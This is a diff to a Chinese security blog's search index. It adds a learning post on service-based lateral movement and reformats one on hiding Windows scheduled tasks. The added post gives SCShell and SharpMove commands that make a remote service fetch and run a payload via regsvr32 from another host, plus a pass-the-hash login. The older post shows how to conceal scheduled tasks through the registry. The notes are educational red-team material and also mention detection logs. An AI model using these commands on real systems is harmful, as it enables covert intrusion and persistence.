@@ -3,11 +3,12 @@
   <entry>
     <title>Windows下任务计划隐藏方式</title>
     <url>/2021/03/04/Windows%E4%B8%8B%E4%BB%BB%E5%8A%A1%E8%AE%A1%E5%88%92%E9%9A%90%E8%97%8F%E6%96%B9%E5%BC%8F/</url>
-    <content><![CDATA[<img src="https://faithlove.github.io/pic/2018/HexoThumb/topPicPre.png" width="50%">
+    <content><![CDATA[<img src="https://faithlove.github.io/pic/2018/HexoThumb/topPicPre.png" width="100%">
 <span id="more"></span>
-### 作者：REInject@73lab@青藤实验室 ###
-原文链接：https://mp.weixin.qq.com/s/ktGug1VbSpmzh9CEGKbbdw
+------------------------------------
 
+
+<h3 id="作者：REInject-73lab-青藤实验室"><a href="#作者：REInject-73lab-青藤实验室" class="headerlink" title="作者：REInject@73lab@青藤实验室"></a>作者：REInject@73lab@青藤实验室</h3><p>原文链接：<a href="https://mp.weixin.qq.com/s/ktGug1VbSpmzh9CEGKbbdw">https://mp.weixin.qq.com/s/ktGug1VbSpmzh9CEGKbbdw</a></p>
 <h4 id="计划任务的创建方式"><a href="#计划任务的创建方式" class="headerlink" title="计划任务的创建方式"></a>计划任务的创建方式</h4><p><strong>命令行创建计划</strong>任务包括 at.exe 和 schtasks.exe<br><strong>at.exe</strong><br>使用 at 命令创建计划任务的方式：</p>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line">at <span class="number">11</span>:<span class="number">11</span> /every:Sunday,Monday,Tue**sday <span class="string">&quot;malware.exe&quot;</span></span><br></pre></td></tr></table></figure>
 <p>以上命令将创建一个计划任务，在每周日、周一、周二的 11:11 执行 malware.exe<br><strong>schtasks.exe</strong><br>at.exe 在 windows8 开始就弃用了，之后的系统都是使用 schtasks.exe 创建计划任务，该命令参数信息请自行百度或者HELP查看<br>例:</p>
@@ -47,6 +48,38 @@
 <h4 id="完全隐藏"><a href="#完全隐藏" class="headerlink" title="完全隐藏"></a>完全隐藏</h4><p>以上内容均来源于青藤云文章本地测试所得，在测试过程中，发现直接删除注册表</p>
 <figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE<span class="symbol">\S</span>oftware<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows NT<span class="symbol">\C</span>urrentVersion<span class="symbol">\S</span>chedule<span class="symbol">\T</span>askCache<span class="symbol">\T</span>ree\</span><br></pre></td></tr></table></figure>
 <p>下的对应任务项，计划任务仍在运行，由此实现完全隐藏，但重启之后计划任务就会失效，且无法删除</p>
+]]></content>
+      <tags>
+        <tag>Windows</tag>
+        <tag>后渗透</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>基于服务的横向渗透学习</title>
+    <url>/2021/03/08/%E5%9F%BA%E4%BA%8E%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<img src="https://faithlove.github.io/pic/2018/DynamicProxy/topPicPre.png" width="100%">
+<span id="more"></span>
+
+<p>前几天在pentestlab学习了一个新的想法，想着就打算写篇文章加深一下<br>###原文链接:<a href="https://pentestlab.blog/2020/07/21/lateral-movement-services">https://pentestlab.blog/2020/07/21/lateral-movement-services</a> ###</p>
+<h2 id="基于服务的横向渗透"><a href="#基于服务的横向渗透" class="headerlink" title="基于服务的横向渗透"></a>基于服务的横向渗透</h2><p><strong>PSEXEC</strong><br>原理:</p>
+<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>利用ADMIN$共享放<span class="module-access"><span class="module"><span class="identifier">Psexesvc</span>.</span></span>exe至远程主机</span><br><span class="line"><span class="number">2.</span>通过服务管理SCManager远程创建psexecsvc服务，并启动服务</span><br><span class="line"><span class="number">3.</span>客户端连接执行命令，服务端启动相应的程序并执行回显数据</span><br></pre></td></tr></table></figure>
+<p>注:</p>
+<ol>
+<li>PSEXESVC服务将会安装在远程系统中，此时将会生成Event 4697和Event 7045这两种事件日志。需要注意的是，Event 4697日志记录将有可能包含账号信息。</li>
+<li>程序Psexesvc.exe会提取到windows目录下</li>
+<li>安装服务会留下明显的日志，而且服务没有删除的风险更大，管理员很容易就会发现</li>
+</ol>
+<p>个人水平有限，除了psexec暂时没了解到其它的基于服务的手段(当然你也可以手动连接上传文件创建服务）</p>
+<p><strong>SCSHELL</strong><br>国外大牛MrUn1k0d3r在工具中用了一种新的方法,利用OpenSCManager API对现有服务的二进制文件进行直接修改,并且可以配合regsvr32使文件不落地</p>
+<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">SCShell.exe 10.0.0.11 XblAuthManager &quot;C:<span class="symbol">\w</span>indows<span class="symbol">\s</span>ystem32<span class="symbol">\c</span>md.exe /c C:<span class="symbol">\w</span>indows<span class="symbol">\s</span>ystem32<span class="symbol">\r</span>egsvr32.exe /s /n /u /i:http://10.0.0.21:8080/p</span><br><span class="line">entestlab.sct scrobj.dll&quot; . pentestlab Password123</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/03/08/%E5%9F%BA%E4%BA%8E%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/../../../../photo/lateral-movement-scshell.png" alt="Alt text"></p>
+<p><img src="/2021/03/08/%E5%9F%BA%E4%BA%8E%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/../../../../photo/lateral-movement-scshell-meterpreter.png" alt="Alt text"></p>
+<p>工具里配套了python版本的工具,python版使用了DCERPC来认证，不是SMB，这样就可以在非域的机器上使用(配合代理使用)</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">python3</span> scshell.py pentestlaboratories/pentestlab@<span class="number">10.0.0.11</span> -hashes aad<span class="number">3</span>b<span class="number">435</span>b<span class="number">51404</span>eeaad<span class="number">3</span>b<span class="number">435</span>b<span class="number">51404</span>ee:<span class="number">58</span>a<span class="number">478135</span>a<span class="number">93</span>ac<span class="number">3</span>bf<span class="number">058</span>a<span class="number">5</span>ea<span class="number">0</span>e<span class="number">8</span>fdb<span class="number">71</span></span><br><span class="line"><span class="attribute">C</span>:\windows\system<span class="number">32</span>\cmd.exe /c C:\windows\system<span class="number">32</span>\regsvr<span class="number">32</span>.exe /s /n /u /i:http://<span class="number">10.0.0.21:8080</span>/pentestlab.sct scrobj.dll</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/03/08/%E5%9F%BA%E4%BA%8E%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/../../../../photo/lateral-movement-scshell-python.png" alt="Alt text"></p>
+<p>另一种方法是利用WMI来利用(SharpMOVE)</p>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">SharpMove.exe <span class="attribute">action</span>=modsvc <span class="attribute">computername</span>=PC1 <span class="attribute">command</span>=<span class="string">&quot;cmd.exe /c \\10.0.0.21\pentestlab\pentestlab.exe&quot;</span> <span class="attribute">amsi</span>=<span class="literal">true</span> <span class="attribute">servicename</span>=pentestlab <span class="attribute">username</span>=pentestlab <span class="attribute">password</span>=Password123</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/03/08/%E5%9F%BA%E4%BA%8E%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/../../../../photo/lateral-movement-sharpmove.png" alt="Alt text"><br><img src="/2021/03/08/%E5%9F%BA%E4%BA%8E%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/../../../../photo/lateral-movement-sharpmove-meterpreter.png" alt="Alt text"><br>工具地址:<a href="https://github.com/Mr-Un1k0d3r/SCShell">https://github.com/Mr-Un1k0d3r/SCShell</a><br><a href="https://github.com/0xthirteen/SharpMove">https://github.com/0xthirteen/SharpMove</a><br>(本人只是搬运工）</p>
 ]]></content>
       <tags>
         <tag>Windows</tag>
